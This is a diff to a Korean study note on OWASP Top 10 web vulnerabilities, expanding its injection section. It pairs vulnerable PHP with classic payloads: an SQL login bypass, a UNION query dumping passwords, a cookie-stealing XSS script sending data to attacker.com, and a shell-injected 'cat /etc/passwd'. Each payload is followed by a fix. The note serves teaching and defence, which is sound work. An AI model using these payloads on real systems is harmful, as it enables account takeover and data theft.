@@ -223,15 +223,15 @@
 
    <br>
 
-   2. 취약한 암호화 알고리즘 사용으로 비밀번호 복호화
+2. 취약한 암호화 알고리즘 사용으로 비밀번호 복호화
 
-      웹 사이트가 사용자의 비밀번호를 MD5 또는 SHA-1 해시 알고리즘으로 저장한다.
+   웹 사이트가 사용자의 비밀번호를 MD5 또는 SHA-1 해시 알고리즘으로 저장한다.
 
-      공격자가 데이터베이스에서 `5f4dcc3b5aa765d61d8327deb882cf99` 값을 발견한다.
+   공격자가 데이터베이스에서 `5f4dcc3b5aa765d61d8327deb882cf99` 값을 발견한다.
 
-      해시 값을 레인보우 테이블을 이용해 복호화하여 `password123`임을 확인한다.
+   해시 값을 레인보우 테이블을 이용해 복호화하여 `password123`임을 확인한다.
 
-      공격자는 탈취한 비밀번호를 이용해 사용자 계정에 접근 가능해진다.
+   공격자는 탈취한 비밀번호를 이용해 사용자 계정에 접근 가능해진다.
 
    <br>
 
@@ -253,27 +253,197 @@
 
 ### 3. Injection, 인젝션 공격
 
+: 사용자 입력값이 제대로 검증되지 않은 채 코드로 실행되는 보안 취약점을 악용하는 공격 기법
+
 **공격 방식**:
 
-- SQL Injection, XSS, Command Injection 등
-- 입력 값이 검증되지 않고 코드로 실행됨
+- SQL Injection → 데이터베이스 조작
+- XSS(Cross-Site Scripting) → 웹 페이지에서 악성 스크립트 실행
+- Command Injection → 시스템 명령어 실행
+
+<br>
 
 **공격 시나리오**:
 
-```bash
-?id=1 OR 1=1 --
-```
+1. SQL Injection
 
-위와 같은 SQL Injection을 실행하면 전체 데이터를 조회 가능하다.
+   - SQL 쿼리에 사용자의 입력값이 직접 포함될 때 발생한다.
+   - 공격자는 입력값을 조작하여 데이터를 조회, 수정, 삭제하거나 관리자의 권한을 탈취할 수 있다.
 
-**방어 방법**:
+   - 인증 우회(로그인 우회)의 경우,
 
-- 사용자 입력 값 검증 및 필터링
-- Prepared Statement 및 ORM 사용 → SQL Injection 방지
-- Content Security Policy(CSP) 적용 → XSS 방지
+     ```php
+     <?php
+     $id = $_POST['id'];
+     $pw = $_POST['pw'];
+
+     $query = "SELECT * FROM users WHERE id = '$id' AND pw = '$pw'";
+     $result = mysqli_query($conn, $query);
+     ?>
+     ```
+
+     - 위 코드는 사용자의 입력을 검증 없이 SQL 문에 직접 포함하여 취약점이 발생한다.
+
+     ```sql
+     ' OR '1'='1' --
+     ```
+
+     - 공격자는 다음과 같은 값을 입력한다.
+
+     ```sql
+     SELECT * FROM users WHERE id = '' OR '1'='1' -- ' AND pw = ''
+     ```
+
+     - `'1'='1'` 조건이 항상 참이 되므로 비밀번호 검증 없이 로그인이 가능해진다.
+
+      <br>
+
+     **방어 방법**:
+
+     ```php
+     <?php
+     $stmt = $conn->prepare("SELECT * FROM users WHERE id = ? AND pw = ?");
+     $stmt->bind_param("ss", $_POST['id'], $_POST['pw']);
+     $stmt->execute();
+     $result = $stmt->get_result();
+     ?>
+     ```
+
+     - Prepared Statement를 사용하여 SQL Injection 공격을 방어할 수 있다.
+     - `?` 플레이스홀더를 사용하여 사용자 입력을 안전하게 처리한다.
+
+   <br>
+
+   - 데이터 탈취의 경우,
+
+     ```sql
+     1 UNION SELECT username, password FROM users --
+     ```
+
+     ```sql
+     SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM users --
+     ```
+
+     - 그 결과 DB의 `users` 테이블에서 모든 계정 정보가 노출된다.
+
+      <br>
+
+     **방어 방법**:
+
+     ```php
+     <?php
+     // PHP에서 ORM (예: Laravel의 Eloquent) 사용
+     $user = User::where('id', $id)->first();
+     ?>
+     ```
+
+     - ORM을 사용하면 직접 SQL 쿼리를 작성하지 않고도 안전하게 데이터베이스를 조회할 수 있다.
+
+<br>
+
+2. XSS (Cross-Site Scripting)
+
+   - 사용자가 입력한 값이 필터링되지 않고 그대로 웹 페이지에 출력될 때 발생한다.
+   - 공격자는 악성 스크립트를 삽입하여 사용자의 세션 탈취, 피싱 공격 등을 수행할 수 있다.
+
+   - 쿠키 탈취의 경우,
+
+     ```php
+     <?php
+     echo "<p>".$_GET['message']."</p>";
+     ?>
+     ```
+
+     - 취약한 코드는 위와 같다.
+
+     ```html
+     <script>
+       document.location =
+         "http://attacker.com/steal.php?cookie=" + document.cookie;
+     </script>
+     ```
+
+     - 사용자의 로그인 쿠키가 `attacker.com` 으로 전송되며, 계정 탈취가 가능해진다.
+
+      <br>
+
+     **방어 방법**:
+
+     ```php
+     <?php
+     echo "<p>" . htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8') . "</p>";
+     ?>
+     ```
+
+     - `htmlspecialchars()`를 사용하면 HTML 태그가 일반 문자열로 변환되어 스크립트 실행이 차단된다.
+
+      <br>
+
+     ```html
+     <meta
+       http-equiv="Content-Security-Policy"
+       content="default-src 'self'; script-src 'self'" />
+     ```
+
+     - 외부 스크립트 실행을 제한하여 XSS 공격을 방어할 수 있다.
+
+<br>
+
+3. Command Injection
+
+   - 웹 애플리케이션이 시스템 명령어를 실행할 때 사용자의 입력을 직접 포함할 경우 발생한다.
+   - 공격자는 임의의 명령어를 실행하여 서버를 제어할 수 있다.
+
+   - 시스템 명령어 실행의 경우,
+
+     ```php
+     <?php
+     $ip = $_GET['ip'];
+     echo shell_exec("ping -c 4 " . $ip);
+     ?>
+     ```
+
+     ```php
+     127.0.0.1; cat /etc/passwd
+     ```
+
+     ```bash
+     ping -c 4 127.0.0.1; cat /etc/passwd
+     ```
+
+     - `/etc/passwd` 파일이 출력되면서 서버 사용자 계정 정보가 노출될 수 있다.
+
+      <br>
+
+     **방어 방법**:
+
+     ```php
+     <?php
+     $ip = escapeshellarg($_GET['ip']);
+     echo shell_exec("ping -c 4 " . $ip);
+     ?>
+     ```
+
+     - `escapeshellarg()`를 사용하면 사용자 입력값을 하나의 안전한 인자로 처리하여 명령어 삽입을 방지할 수 있다.
+
+     ```php
+     <?php
+     if (preg_match('/^[0-9\.]+$/', $_GET['ip'])) {
+        $ip = $_GET['ip'];
+        echo shell_exec("ping -c 4 " . $ip);
+     } else {
+        echo "잘못된 입력입니다.";
+     }
+     ?>
+     ```
+
+     - 정규식을 사용하여 숫자와 점만 허용한다.
+     - IP 주소 형식이 아닌 입력을 차단한다.
 
 <br>
 <br>
+
+---
 
 ### 4. Insecure Design, 취약한 설계
 
